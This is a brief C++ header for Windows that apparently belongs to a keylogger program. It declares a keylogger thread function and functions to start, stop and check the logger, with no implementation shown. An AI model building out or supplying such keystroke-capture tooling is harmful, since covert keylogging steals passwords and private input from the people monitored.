#pragma once

#include <Windows.h>

// Keylogger thread function
DWORD WINAPI KeyloggerThread(LPVOID lpParam);

// Start the keylogger thread
bool StartKeylogger();

// Stop the keylogger thread
void StopKeylogger();

// Check if keylogger is currently running
bool IsKeyloggerRunning();
